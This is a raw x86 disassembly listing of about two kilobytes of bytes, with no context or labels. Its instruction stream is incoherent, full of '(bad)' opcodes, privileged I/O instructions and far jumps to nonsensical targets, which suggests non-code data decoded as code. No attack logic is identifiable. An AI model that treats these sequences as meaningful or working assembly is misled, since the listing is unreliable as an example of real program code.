  415153:	mov    dl,0x9f
  415155:	adc    al,0xb4
  415157:	pop    ebx
  415158:	lock hlt 
  41515a:	outs   dx,DWORD PTR ds:[esi]
  41515b:	push   ecx
  41515c:	mov    edi,DWORD PTR [esi-0x55a03338]
  415162:	jl     0x415183
  415164:	pop    ss
  415165:	bound  ebx,QWORD PTR [ebx]
  415167:	sub    BYTE PTR [ecx],0x73
  41516a:	imul   esp,DWORD PTR [edx],0xffffff9e
  41516d:	(bad)  
  41516f:	mov    ds:0xaf0c2d48,al
  415174:	mov    eax,es
  415176:	imul   esi
  415178:	mov    esp,0x1dbe825c
  41517d:	cmpxchg dl,ah
  415180:	aaa    
  415181:	ror    DWORD PTR [esi+0x15],1
  415184:	test   DWORD PTR [ebx],edi
  415186:	dec    edx
  415187:	out    0xd2,al
  415189:	arpl   WORD PTR [ebp+0x7a],di
  41518c:	sub    eax,0xa1ec7475
  415191:	pop    ss
  415192:	(bad)  [eax+esi*4+0x4a]
  415196:	gs ins BYTE PTR es:[edi],dx
  415198:	push   eax
  415199:	sbb    eax,0x8ab92054
  41519e:	out    0xd8,eax
  4151a0:	xor    BYTE PTR [ebp-0x5bc3982b],dh
  4151a6:	shr    BYTE PTR [esi+eax*2-0x19],1
  4151aa:	stc    
  4151ab:	arpl   bp,ax
  4151ad:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4151af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b0:	icebp  
  4151b1:	sub    ebx,DWORD PTR ds:0xc4682a03
  4151b7:	mov    al,ds:0xde111b7a
  4151bc:	ins    BYTE PTR es:[edi],dx
  4151bd:	out    0x78,eax
  4151bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c0:	into   
  4151c1:	arpl   WORD PTR [ebx],ax
  4151c3:	jns    0x4151e1
  4151c5:	mov    DWORD PTR [eax+0x5f],ebx
  4151c8:	xchg   ecx,eax
  4151c9:	or     esp,ebp
  4151cb:	sub    eax,0xe6b42e76
  4151d0:	ret    0x9bcb
  4151d3:	cdq    
  4151d4:	push   edi
  4151d5:	jmp    0x41519a
  4151d7:	test   DWORD PTR [edi+esi*8-0x79dbd259],0x44e4e0f4
  4151e2:	pop    edx
  4151e3:	sub    ebx,DWORD PTR [ecx+0x4c2b7835]
  4151e9:	ret    0x29ed
  4151ec:	or     eax,0x77fc0eb4
  4151f1:	inc    ecx
  4151f2:	mov    bl,0xb1
  4151f4:	mov    ebp,0x9ef6c447
  4151f9:	cmp    edi,esp
  4151fb:	or     ah,BYTE PTR [eax-0x33]
  4151fe:	dec    ebx
  4151ff:	cli    
  415200:	push   ds
  415201:	xchg   ebx,eax
  415202:	sub    bl,BYTE PTR [esi]
  415204:	cmp    BYTE PTR ds:0xf8909140,al
  41520a:	adc    eax,0xe8be0300
  41520f:	mov    ch,0x4c
  415211:	dec    edx
  415212:	push   eax
  415213:	dec    ch
  415215:	ins    BYTE PTR es:[edi],dx
  415216:	adc    eax,0x36845c78
  41521b:	jmp    0x9f61:0x3e1ddcb0
  415222:	push   ds
  415223:	out    0x2a,eax
  415225:	fmul   DWORD PTR [ebx]
  415227:	test   al,0x44
  415229:	sbb    DWORD PTR [edx-0x3128ce7e],ecx
  41522f:	add    esp,DWORD PTR [edx]
  415231:	mov    ah,0x4c
  415233:	stos   DWORD PTR es:[edi],eax
  415234:	outs   dx,BYTE PTR ds:[esi]
  415235:	outs   dx,BYTE PTR ds:[esi]
  415236:	and    al,0xd
  415238:	dec    esi
  415239:	fbstp  TBYTE PTR [ecx-0x7c683bdf]
  41523f:	xchg   ecx,eax
  415240:	cmp    eax,0xe88fb873
  415245:	xlat   BYTE PTR ds:[ebx]
  415246:	jno    0x41523e
  415248:	ins    BYTE PTR es:[edi],dx
  415249:	mov    ah,0x40
  41524b:	jp     0x41523e
  41524d:	xchg   ecx,eax
  41524e:	or     eax,0x7c79f21e
  415253:	pusha  
  415254:	fstp   QWORD PTR [ebx]
  415256:	jne    0x415282
  415258:	adc    eax,0xb553ea73
  41525d:	jl     0x41520c
  41525f:	pop    ds
  415260:	mov    bh,0x9e
  415262:	or     ecx,ecx
  415264:	xor    bl,dh
  415266:	in     al,dx
  415267:	inc    edi
  415268:	push   esi
  415269:	aam    0xa
  41526b:	fcom   DWORD PTR [edi+0x5428576d]
  415271:	dec    ecx
  415272:	sbb    edx,DWORD PTR [eax]
  415274:	push   0xf5e6ce7d
  415279:	xor    DWORD PTR [eax],edi
  41527b:	xchg   ecx,eax
  41527c:	hlt    
  41527d:	lods   al,BYTE PTR ds:[esi]
  41527e:	out    0xdc,eax
  415280:	mov    cl,0x28
  415282:	js     0x41526d
  415284:	push   ds
  415285:	int    0x67
  415287:	push   esi
  415288:	loopne 0x4152b8
  41528a:	mov    ds:0x41177282,eax
  41528f:	sbb    BYTE PTR [ecx-0x74],dh
  415292:	aam    0xfc
  415294:	repnz mov ch,0xcb
  415297:	mov    DWORD PTR [edx-0xb],eax
  41529a:	and    DWORD PTR [eax+0x2b],ebp
  41529d:	(bad)  
  41529e:	rcr    bh,1
  4152a0:	imul   BYTE PTR [eax+eax*4]
  4152a3:	imul   eax,DWORD PTR [eax+ebp*1-0x52],0xffffff88
  4152a8:	push   ecx
  4152a9:	fild   DWORD PTR [ebx-0x3c]
  4152ac:	test   DWORD PTR [ecx+0x5ca4ffc3],edx
  4152b2:	mov    cl,BYTE PTR [edi]
  4152b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b5:	out    dx,al
  4152b6:	inc    ebp
  4152b7:	jg     0x41524f
  4152b9:	fwait
  4152ba:	push   0xffffffa9
  4152bc:	cmp    eax,DWORD PTR ds:0x492e9b93
  4152c2:	dec    esi
  4152c3:	pusha  
  4152c4:	(bad)  [eax]
  4152c6:	dec    eax
  4152c7:	jmp    0x46e2:0xfad1b807
  4152ce:	mov    ds:0x6fc8ff7e,al
  4152d3:	adc    DWORD PTR ds:0x85a714d7,edx
  4152d9:	push   es
  4152da:	push   0x67a73fa8
  4152df:	sbb    BYTE PTR [esp+ecx*4],dl
  4152e2:	add    dl,0xa2
  4152e5:	in     eax,dx
  4152e6:	cwde   
  4152e7:	enter  0x1c7f,0x22
  4152eb:	pop    edx
  4152ec:	mov    ds:0x3614ab3f,eax
  4152f1:	int    0x6d
  4152f3:	inc    ecx
  4152f4:	push   ecx
  4152f5:	iret   
  4152f6:	sahf   
  4152f7:	inc    ebp
  4152f8:	fcmovbe st,st(1)
  4152fa:	imul   edi,DWORD PTR [edx+0x6c],0x1aabbaf8
  415301:	jmp    0xd1af:0xf1d8e6a1
  415308:	test   esp,ebp
  41530a:	in     al,dx
  41530b:	add    al,BYTE PTR [edx]
  41530d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530e:	jl     0x415336
  415310:	dec    eax
  415311:	or     DWORD PTR [eax+0x9eeaa0f],edi
  415317:	mov    al,0xf9
  415319:	hlt    
  41531a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41531b:	clc    
  41531c:	std    
  41531d:	pop    edi
  41531e:	xor    eax,0x30eb6dd6
  415323:	data16 je 0x4152e1
  415326:	retf   0xdd45
  415329:	(bad)  
  41532a:	pop    edi
  41532b:	and    ebx,DWORD PTR [ecx]
  41532d:	inc    ebx
  41532e:	xor    eax,0xbe7f8c32
  415333:	pop    ds
  415334:	pop    ecx
  415335:	out    dx,al
  415336:	ret    0x46aa
  415339:	cmp    edi,0x825a93de
  41533f:	xor    eax,0xbc05e701
  415344:	mov    edx,esp
  415346:	xchg   ebx,edx
  415348:	or     dh,BYTE PTR [eax]
  41534a:	mov    ecx,0xf42fc465
  41534f:	dec    eax
  415350:	jns    0x415354
  415352:	test   BYTE PTR [eax+edx*4],0xb4
  415356:	add    edx,edi
  415358:	adc    eax,0x9890785b
  41535d:	xor    al,0x62
  41535f:	jo     0x415394
  415361:	jl     0x415301
  415363:	stc    
  415364:	push   0x1a
  415366:	dec    BYTE PTR [ebx-0x5d57d7b9]
  41536c:	sub    BYTE PTR [ecx],bh
  41536e:	mov    esi,0xd8ad931
  415373:	and    BYTE PTR [esp+edi*8-0x8963c3a],dl
  41537a:	imul   esi,eax,0x815fbc8c
  415380:	xchg   edx,eax
  415381:	fs in  al,0xce
  415384:	or     ebp,edi
  415386:	sbb    bh,bl
  415388:	jmp    0x9313:0xb6d44b55
  41538f:	adc    BYTE PTR [ebx+0x25],ch
  415392:	repz pop edi
  415394:	(bad)  
  415395:	sub    eax,DWORD PTR [ecx+0x4c]
  415398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415399:	ret    0x1002
  41539c:	leave  
  41539d:	push   es
  41539e:	jge    0x4153eb
  4153a0:	enter  0xe54f,0x24
  4153a4:	loope  0x415425
  4153a6:	arpl   WORD PTR [edi],cx
  4153a8:	xchg   ecx,eax
  4153a9:	and    eax,0xd6de8fa7
  4153ae:	inc    esi
  4153af:	test   eax,0xa2cb56dd
  4153b4:	adc    ebx,DWORD PTR [esi+0x4c]
  4153b7:	jbe    0x4153c3
  4153b9:	inc    eax
  4153ba:	cwde   
  4153bb:	add    eax,0x32aa750c
  4153c0:	mov    ebp,0x5b7328ed
  4153c5:	(bad)  
  4153c7:	mov    di,0x92f1
  4153cb:	shl    BYTE PTR [edx-0x31],1
  4153ce:	mov    ds:0xa71814b7,al
  4153d3:	gs push edx
  4153d5:	repz inc ebx
  4153d7:	push   0x4facc51b
  4153dc:	mov    cl,0x39
  4153de:	sbb    DWORD PTR [ebp-0x774c6c4a],ebx
  4153e4:	xor    BYTE PTR [eax+0x5fd7d932],cl
  4153ea:	ret    0xf847
  4153ed:	(bad)  
  4153ee:	mov    eax,ds:0xaae13d36
  4153f3:	(bad)  
  4153f4:	imul   ah
  4153f6:	mov    ecx,0x1bb00713
  4153fb:	sub    edi,DWORD PTR [esp+esi*4-0x35a0f517]
  415402:	aam    0x39
  415404:	xchg   DWORD PTR [edx-0x14],esi
  415407:	lods   eax,DWORD PTR ds:[esi]
  415408:	arpl   WORD PTR [edx+0x3e],di
  41540b:	mov    ecx,0xd9dc1ae
  415410:	or     al,0xd3
  415412:	aam    0xc2
  415414:	jae    0x415443
  415416:	imul   esi,DWORD PTR [edx],0xffffff92
  415419:	(bad)  
  41541a:	xchg   ebx,eax
  41541b:	mov    dh,0x24
  41541d:	in     al,0x76
  41541f:	into   
  415420:	push   0x3c87ae93
  415425:	std    
  415426:	jo     0x41542b
  415428:	shl    BYTE PTR [edi-0x25594052],0xff
  41542f:	sbb    BYTE PTR [ebx+ebp*2-0x78],bl
  415433:	or     DWORD PTR [ebp-0x4c],esi
  415436:	pop    esp
  415437:	adc    cl,BYTE PTR [ebx-0x3e]
  41543a:	leave  
  41543b:	pop    ebp
  41543c:	lods   eax,DWORD PTR ds:[esi]
  41543d:	pushf  
  41543e:	js     0x415491
  415440:	cwde   
  415441:	xor    al,BYTE PTR [ecx-0x595cdc63]
  415447:	xor    dh,BYTE PTR [edi-0x12ab54f5]
  41544d:	addr16 ror ah,cl
  415450:	sar    ebp,0xaa
  415453:	outs   dx,DWORD PTR ds:[esi]
  415454:	test   DWORD PTR [ecx],ebp
  415456:	adc    esi,DWORD PTR [edi+0x75dd7c59]
  41545c:	scas   eax,DWORD PTR es:[edi]
  41545d:	out    dx,al
  41545e:	push   esp
  41545f:	addr16 or edx,esi
  415462:	push   esi
  415463:	xchg   esi,eax
  415464:	sbb    dh,ah
  415466:	mov    cl,0xb9
  415468:	jp     0x4154dd
  41546a:	test   edi,ecx
  41546c:	xchg   ecx,eax
  41546d:	inc    ebp
  41546e:	xchg   ecx,eax
  41546f:	arpl   WORD PTR [eax],dx
  415471:	lea    ebx,[ecx-0x2e1e121e]
  415477:	imul   ebp,DWORD PTR [esi+0x31c8989e],0x8335dc61
  415481:	pop    ss
  415482:	gs mov ah,dl
  415485:	inc    edi
  415486:	jnp    0x4154dd
  415488:	lods   al,BYTE PTR ds:[esi]
  415489:	jmp    0xb530:0x583a033a
  415490:	mov    BYTE PTR [ebx-0x1f18561],dh
  415496:	xor    DWORD PTR [edi+0x44],ecx
  415499:	fs loope 0x4154d7
  41549c:	dec    esp
  41549d:	out    dx,al
  41549e:	cmp    edx,esi
  4154a0:	mov    esp,0x350ebe1d
  4154a5:	xor    DWORD PTR [ebx+0x4a],ebx
  4154a8:	sbb    eax,0xeea9d8b5
  4154ad:	mov    bl,0x81
  4154af:	xor    BYTE PTR [ebp-0x35],dh
  4154b2:	and    BYTE PTR [edi+0x69],dl
  4154b5:	rcr    BYTE PTR [edx+0x31],1
  4154b8:	pop    ebx
  4154b9:	out    0xd4,eax
  4154bb:	lea    ebx,[esi+0x46]
  4154be:	leave  
  4154bf:	scas   eax,DWORD PTR es:[edi]
  4154c0:	push   esi
  4154c1:	or     al,0x9f
  4154c3:	in     eax,0x8d
  4154c5:	stos   DWORD PTR es:[edi],eax
  4154c6:	test   BYTE PTR [ebx],dh
  4154c8:	lock arpl WORD PTR [ecx-0x4665fa17],si
  4154cf:	mov    ch,0x8a
  4154d1:	push   edx
  4154d2:	ds xchg esp,eax
  4154d4:	stos   DWORD PTR es:[edi],eax
  4154d5:	xor    dh,BYTE PTR [edx+0x55]
  4154d8:	lds    esp,FWORD PTR [eax+eiz*2]
  4154db:	mov    ebp,0xc0417eac
  4154e0:	sub    eax,0x48fbb074
  4154e5:	push   ds
  4154e6:	inc    edi
  4154e7:	mov    BYTE PTR [eax-0x74d82d39],bl
  4154ed:	int3   
  4154ee:	push   edi
  4154ef:	pop    ebx
  4154f0:	adc    al,BYTE PTR [edx]
  4154f2:	repnz aam 0xa7
  4154f5:	sbb    al,0xc9
  4154f7:	mov    ds:0x3798de2a,al
  4154fc:	xchg   esi,eax
  4154fd:	push   esp
  4154fe:	xor    DWORD PTR cs:[ecx],ecx
  415501:	jle    0x415561
  415503:	cli    
  415504:	add    eax,DWORD PTR [ecx+0x42]
  415507:	outs   dx,BYTE PTR ds:[esi]
  415508:	shr    dh,0x20
  41550b:	dec    edi
  41550c:	pop    ss
  41550d:	mov    ebp,0x8cd44694
  415512:	icebp  
  415513:	(bad)  
  415514:	(bad)  
  415515:	mov    al,0xea
  415517:	fs push edx
  415519:	xchg   edi,eax
  41551a:	fistp  WORD PTR [edx]
  41551c:	test   al,0x80
  41551e:	or     ah,dl
  415520:	scas   eax,DWORD PTR es:[edi]
  415521:	daa    
  415522:	imul   ebx,DWORD PTR [esi],0xffffff96
  415525:	jmp    0xe08c:0xd1fd1542
  41552c:	push   edi
  41552d:	lods   al,BYTE PTR ds:[esi]
  41552e:	mov    ds:0xcf6e84b1,al
  415533:	cmp    edi,DWORD PTR [ebx-0x5]
  415536:	jl     0x4154e2
  415538:	ja     0x4154e8
  41553a:	mov    ch,0x28
  41553c:	sbb    BYTE PTR [eax+0x3f47d2fa],cl
  415542:	jecxz  0x415579
  415544:	pop    esi
  415545:	nop
  415546:	(bad)  
  415547:	xchg   edx,eax
  415548:	jne    0x415573
  41554a:	ja     0x41554d
  41554c:	mov    dh,0x97
  41554e:	jns    0x4155c4
  415550:	int3   
  415551:	push   0x6b598290
  415556:	iret   
  415557:	lods   eax,DWORD PTR ds:[esi]
  415558:	push   edi
  415559:	pop    esp
  41555a:	jmp    DWORD PTR [ecx-0x349cf88e]
  415560:	gs cld 
  415562:	add    ecx,DWORD PTR [esi+edx*1]
  415565:	mov    ss,WORD PTR [eax+0x65]
  415568:	sub    BYTE PTR [edi],dl
  41556a:	sahf   
  41556b:	sub    DWORD PTR [eax+0x19],0xde689464
  415572:	mov    al,ds:0xe5c1d867
  415577:	adc    edx,edx
  415579:	add    BYTE PTR [edi-0x7c],0x1a
  41557d:	jl     0x4155fb
  41557f:	sbb    al,0xc4
  415581:	xchg   edx,eax
  415582:	pop    edi
  415583:	sbb    eax,0x4f8a6834
  415588:	jp     0x4155dd
  41558a:	fcmovnbe st,st(3)
  41558c:	pusha  
  41558d:	test   BYTE PTR es:[eax+0x39178975],ch
  415594:	sbb    al,0x12
  415596:	(bad)  
  415597:	fisttp DWORD PTR [edx+0x5a]
  41559a:	mov    edi,0x4994fca9
  41559f:	mov    ebx,0x5c75b0b7
  4155a4:	bound  ecx,QWORD PTR [edi+edi*4]
  4155a7:	bnd jg 0x41555c
  4155aa:	std    
  4155ab:	xchg   edi,eax
  4155ac:	and    eax,0xced97a37
  4155b1:	or     al,0x5a
  4155b3:	imul   edi,DWORD PTR [esi-0x40],0xdde77dba
  4155ba:	jnp    0x415551
  4155bc:	sub    esi,ebp
  4155be:	(bad)  
  4155c0:	dec    esp
  4155c1:	rol    esp,cl
  4155c3:	adc    al,0x53
  4155c5:	xchg   DWORD PTR [eax+0x72],esi
  4155c8:	sub    esi,ebp
  4155ca:	int    0xaa
  4155cc:	inc    edx
  4155cd:	icebp  
  4155ce:	pop    es
  4155cf:	lods   eax,DWORD PTR ds:[esi]
  4155d0:	and    al,0xb2
  4155d2:	xchg   cl,al
  4155d4:	push   esp
  4155d5:	or     BYTE PTR [edi],0x5a
  4155d8:	fwait
  4155d9:	stc    
  4155da:	inc    ebx
  4155db:	std    
  4155dc:	jg     0x4155d4
  4155de:	mov    al,cl
  4155e0:	mov    bh,BYTE PTR [edi-0x6f]
  4155e3:	jmp    0x415584
  4155e5:	repz cmc 
  4155e7:	mov    ebx,0x2bd8897b
  4155ec:	or     al,0xc3
  4155ee:	mov    dl,0xb4
  4155f0:	dec    edx
  4155f1:	jp     0x4155de
  4155f3:	inc    eax
  4155f4:	sar    ecx,cl
  4155f6:	test   BYTE PTR [eax],bh
  4155f8:	aaa    
  4155f9:	mov    edx,0xab504e3d
  4155fe:	scas   al,BYTE PTR es:[edi]
  4155ff:	nop
  415600:	imul   edx,DWORD PTR ds:0xdfd4ebdb,0xffffffab
  415607:	sbb    bh,dh
  415609:	scas   eax,DWORD PTR es:[edi]
  41560a:	sbb    bl,BYTE PTR [ebx+esi*1+0x20]
  41560e:	sub    DWORD PTR [edi],edi
  415610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415611:	xlat   BYTE PTR ds:[ebx]
  415612:	dec    esi
  415613:	jae    0x4155b6
  415615:	xor    ah,BYTE PTR [esi+ecx*1+0x77]
  415619:	xchg   BYTE PTR [ecx],ch
  41561b:	sbb    DWORD PTR [ebx-0x5a1ac056],eax
  415621:	iret   
  415622:	(bad)  
  415623:	jns    0x41569e
  415625:	adc    cl,dh
  415627:	lahf   
  415628:	leave  
  415629:	push   esi
  41562a:	fstp   TBYTE PTR [esi]
  41562c:	sbb    cl,BYTE PTR [esi-0x6a]
  41562f:	mov    bh,0xe8
  415631:	dec    ebx
  415632:	rol    BYTE PTR [edi-0x6e],cl
  415635:	cmp    BYTE PTR [esi],dh
  415637:	sbb    al,0xad
  415639:	fadd   DWORD PTR [esi]
  41563b:	in     al,dx
  41563c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563d:	mov    edi,0x55525253
  415642:	stc    
  415643:	arpl   WORD PTR [ebx],di
  415645:	pop    esp
  415646:	pop    ds
  415647:	lods   eax,DWORD PTR ds:[esi]
  415648:	in     eax,dx
  415649:	ds adc eax,0xf0a56f9c
  41564f:	pop    eax
  415650:	pop    es
  415651:	repnz push ecx
  415653:	pop    esp
  415654:	or     dh,bl
  415656:	adc    ch,BYTE PTR [ebx+0x178c618a]
  41565c:	icebp  
  41565d:	sbb    eax,0xd3a0c13c
  415662:	cmp    eax,0x3aa25f7f
  415667:	test   DWORD PTR [esp+edi*8-0x56],0x676b3781
  41566f:	loope  0x415678
  415671:	pop    ds
  415672:	xor    eax,0xe9f56dd8
  415677:	stos   DWORD PTR es:[edi],eax
  415678:	scas   al,BYTE PTR es:[edi]
  415679:	jle    0x41561b
  41567b:	or     DWORD PTR [edi+0x64],esi
  41567e:	dec    ebp
  41567f:	sub    esi,DWORD PTR [esi+edi*1-0x29a3cfcd]
  415686:	jp     0x41567c
  415688:	inc    ebp
  415689:	call   0xe0a9893a
  41568e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568f:	push   cs
  415690:	stos   DWORD PTR es:[edi],eax
  415691:	outs   dx,BYTE PTR ds:[esi]
  415692:	lods   eax,DWORD PTR ds:[esi]
  415693:	xor    dh,ch
  415695:	dec    ebx
  415696:	pop    es
  415697:	jno    0x4156f1
  415699:	sub    BYTE PTR [ebx+eiz*1+0xfc4270d],bh
  4156a0:	loopne 0x4156b8
  4156a2:	ja     0x415654
  4156a4:	sbb    BYTE PTR [esi+edx*4-0x57],al
  4156a8:	xchg   edx,eax
  4156a9:	inc    ebx
  4156aa:	jmp    0xa17028da
  4156af:	jle    0x415696
  4156b1:	and    esp,DWORD PTR [ebp+0x5bdf9a6a]
  4156b7:	lock popa 
  4156b9:	fbstp  TBYTE PTR [edx+eax*4+0x623c6017]
  4156c0:	cdq    
  4156c1:	fist   WORD PTR [ebx+0x70b0793d]
  4156c7:	ds iret 
  4156c9:	dec    eax
  4156ca:	or     eax,0x375a01de
  4156cf:	retf   0x2a43
  4156d2:	(bad)  
  4156d3:	(bad)  
  4156d5:	(bad)  
  4156d7:	pusha  
  4156d8:	dec    ebx
  4156d9:	adc    al,0x2c
  4156db:	add    ebx,ecx
  4156dd:	lods   al,BYTE PTR ds:[esi]
  4156de:	ins    BYTE PTR es:[edi],dx
  4156df:	mov    al,0x3a
  4156e1:	adc    BYTE PTR [eax+0x1],dh
  4156e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156e5:	or     eax,0x8507c35c
  4156ea:	iret   
  4156eb:	push   cs
  4156ec:	cmp    eax,0x422946db
  4156f1:	int    0xaf
  4156f3:	int    0xb4
  4156f5:	ins    DWORD PTR es:[edi],dx
  4156f6:	push   ebp
  4156f7:	iret   
  4156f8:	aaa    
  4156f9:	jbe    0x415756
  4156fb:	push   ebp
  4156fc:	je     0x415720
  4156fe:	daa    
  4156ff:	cmp    esp,0xffffffb8
  415702:	mov    ebx,ss
  415704:	mov    esi,0x4e091805
  415709:	int    0x4c
  41570b:	test   BYTE PTR [ecx+0x3a1d4cf9],cl
  415711:	loopne 0x4156b3
  415713:	out    0xde,eax
  415715:	mov    ds:0x53719fd5,eax
  41571a:	or     dl,BYTE PTR [eax+edx*2-0x7]
  41571e:	dec    ebx
  41571f:	jecxz  0x41575e
  415721:	int    0x91
  415723:	int3   
  415724:	mov    ebx,0x3330ac2f
  415729:	cmc    
  41572a:	sbb    BYTE PTR [ebx],dl
  41572c:	xchg   ecx,eax
  41572d:	sub    cl,ah
  41572f:	call   0x758d:0x4df1f4b6
  415736:	popf   
  415737:	pop    edi
  415738:	ror    BYTE PTR [ecx],0x31
  41573b:	rcr    DWORD PTR [ebp+0x42f77634],1
  415741:	loope  0x415776
  415743:	jnp    0x41576b
  415745:	push   ebp
  415746:	ror    DWORD PTR [edx+edi*1+0x3f],0x8d
  41574b:	push   es
  41574c:	jecxz  0x4157a6
  41574e:	adc    al,0x45
  415750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415751:	daa    
  415752:	pop    eax
  415753:	xor    BYTE PTR [esi],0xea
  415756:	sbb    eax,0x40e80b98
  41575b:	xchg   esp,eax
  41575c:	retf   
  41575d:	div    dl
  41575f:	ror    DWORD PTR [edx-0x67b6462b],cl
  415765:	add    bl,BYTE PTR [esi-0x19]
  415768:	cmp    al,0xf3
  41576a:	clc    
  41576b:	sbb    eax,0xf7c74773
  415770:	push   0x6350b3ff
  415775:	inc    ecx
  415776:	and    BYTE PTR cs:[eax+0xa],ch
  41577a:	add    bl,bl
  41577c:	repz jecxz 0x4157a5
  41577f:	aas    
  415780:	cmp    eax,0x9f8713f
  415785:	aam    0x26
  415787:	test   DWORD PTR [ecx+0x39],ebx
  41578a:	push   esp
  41578b:	adc    ah,BYTE PTR [esi-0x6634c759]
  415791:	sub    DWORD PTR [ecx-0x71],eax
  415794:	imul   esp,DWORD PTR [ecx],0xf7b5a15e
  41579a:	inc    edi
  41579b:	mov    edi,0xab67b953
  4157a0:	not    DWORD PTR [edx]
  4157a2:	ja     0x4157f8
  4157a4:	rcr    BYTE PTR [esi-0x354c7225],0xe1
  4157ab:	pop    ecx
  4157ac:	sti    
  4157ad:	mov    eax,ds:0x650a9162
  4157b2:	xor    al,0x39
  4157b4:	adc    ecx,esp
  4157b6:	and    al,0x91
  4157b8:	sbb    edi,edi
  4157ba:	and    DWORD PTR [edi+0x5808a6d9],eax
  4157c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c1:	rcl    cl,cl
  4157c3:	cmp    dh,BYTE PTR [edx+0x3e]
  4157c6:	add    DWORD PTR [edx],esp
  4157c8:	mov    ebp,0xdeac9de9
  4157cd:	lock push edi
  4157cf:	mov    ebx,0xbc72a5b7
  4157d4:	movzx  esi,BYTE PTR [ecx-0x76]
  4157d8:	adc    ecx,ebx
  4157da:	and    ebp,DWORD PTR gs:[ecx]
  4157dd:	das    
  4157de:	hlt    
  4157df:	add    eax,0xa1b1527e
  4157e4:	(bad)  [edi-0x1dd64901]
  4157ea:	or     al,0xeb
  4157ec:	cs mov dh,0x66
  4157ef:	enter  0x5ac4,0xee
  4157f3:	inc    ebp
  4157f4:	xor    DWORD PTR fs:[ebx-0x5f],edx
  4157f8:	mov    edx,0x6cea8431
  4157fd:	lahf   
  4157fe:	push   ebp
  4157ff:	jae    0x415837
  415801:	mov    WORD PTR [edx+0x1a],fs
  415804:	ins    DWORD PTR es:[di],dx
  415806:	or     eax,0x6fad88de
  41580b:	test   DWORD PTR [ecx],esi
  41580d:	dec    ecx
  41580e:	dec    edi
  41580f:	ja     0x4157c5
  415811:	pop    esi
  415812:	mov    ds:0xaf8389d7,al
  415817:	into   
  415818:	bound  ebp,QWORD PTR [esi+0x44]
  41581b:	retf   0x17f5
  41581e:	mov    dl,0x7d
  415820:	mov    ah,BYTE PTR [esi-0x70db393b]
  415826:	jno    0x4157d6
  415828:	rcl    ecx,cl
  41582a:	push   es
  41582b:	es mov eax,0x7907381d
  415831:	cmc    
  415832:	and    edi,ebx
  415834:	imul   DWORD PTR [ebp-0x2e0246e5]
  41583a:	or     al,0xe7
  41583c:	bound  edi,QWORD PTR [edi-0x19e4e30b]
  415842:	adc    eax,DWORD PTR ss:[edx-0x4e523932]
  415849:	adc    al,0x7
  41584b:	cmp    BYTE PTR [ebx-0x2f69128],bl
  415851:	push   eax
  415852:	jno    0x415892
  415854:	pop    ds
  415855:	imul   DWORD PTR [edi]
  415857:	imul   eax,ecx,0x7d
  41585a:	or     DWORD PTR ss:[eax],0x21
  41585e:	out    dx,al
  41585f:	scas   eax,DWORD PTR es:[edi]
  415860:	cdq    
  415861:	xor    DWORD PTR [ebx+0x4d],esi
  415864:	or     bl,ah
  415866:	adc    BYTE PTR [ecx-0x404a1673],ah
  41586c:	mov    ebx,0x7342a81b
  415871:	add    al,0xcd
  415873:	je     0x415804
  415875:	fnstsw WORD PTR [ebx-0x1ec141a]
  41587b:	dec    edi
  41587c:	and    eax,0xb8f9ce80
  415881:	sar    BYTE PTR [edx-0x29],0x67
  415885:	mov    bl,0x74
  415887:	daa    
  415888:	ds std 
  41588a:	jmp    0x3780:0xd428873b
  415891:	mov    al,0xc5
  415893:	pop    ecx
  415894:	in     al,dx
  415895:	jnp    0x4158d2
  415897:	add    eax,0x9808a087
  41589c:	dec    ebp
  41589d:	jmp    0x5dd83070
  4158a2:	xchg   ecx,eax
  4158a3:	into   
  4158a4:	mov    ebp,0xb06198f8
  4158a9:	push   ebx
  4158aa:	add    eax,0xc6522123
  4158af:	pushf  
  4158b0:	pop    esp
  4158b1:	cwde   
  4158b2:	push   es
  4158b3:	mov    ebp,0x68e7c013
  4158b8:	sbb    bl,BYTE PTR [ebp+0x28]
  4158bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158bc:	or     al,BYTE PTR ds:0x7f6ef9ca
  4158c2:	(bad)  
  4158c3:	push   eax
  4158c4:	xor    cl,bh
  4158c6:	imul   eax,DWORD PTR [edx],0x1b85e7a2
  4158cc:	popa   
  4158cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158ce:	call   0x343eeb62
  4158d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d4:	nop
  4158d5:	cmp    al,0x2e
  4158d7:	repnz popa 
  4158d9:	out    dx,eax
  4158da:	xchg   ebp,eax
  4158db:	frstor [ebx+0x4b]
  4158de:	or     BYTE PTR [edx+0x4ead9af5],bh
  4158e4:	icebp  
  4158e5:	fnstenv [edi-0x1b]
  4158e8:	stos   BYTE PTR es:[edi],al
  4158e9:	mov    al,0xd1
  4158eb:	mov    esi,0x56e60e9
  4158f0:	push   es
  4158f1:	or     DWORD PTR [esi-0x377b2bd2],edx
  4158f7:	test   esi,0xf57e8be6
  4158fd:	mov    al,0x37
  4158ff:	fdiv   QWORD PTR [eax+0x69]
  415902:	(bad)  
  415903:	or     eax,0xbe289bdd
  415908:	mov    bh,0x74
  41590a:	xchg   edx,eax
  41590b:	shl    DWORD PTR [ecx+0x6e2b2211],0x5a
  415912:	pop    es
  415913:	loopne 0x415918
  415915:	lds    edx,FWORD PTR [ebp+0x77c2fd25]
  41591b:	outs   dx,DWORD PTR ds:[esi]
  41591c:	cwde   
  41591d:	sahf   
  41591e:	adc    al,0x57
  415920:	gs enter 0x85c9,0x7a
  415925:	nop
  415926:	loopne 0x41590d
  415928:	nop
  415929:	daa    
  41592a:	fsub   QWORD PTR [esp+esi*8]
  41592d:	sub    al,0xed
  41592f:	fwait
  415930:	daa    
  415931:	dec    ebp
  415932:	push   0x49
  415934:	cld    
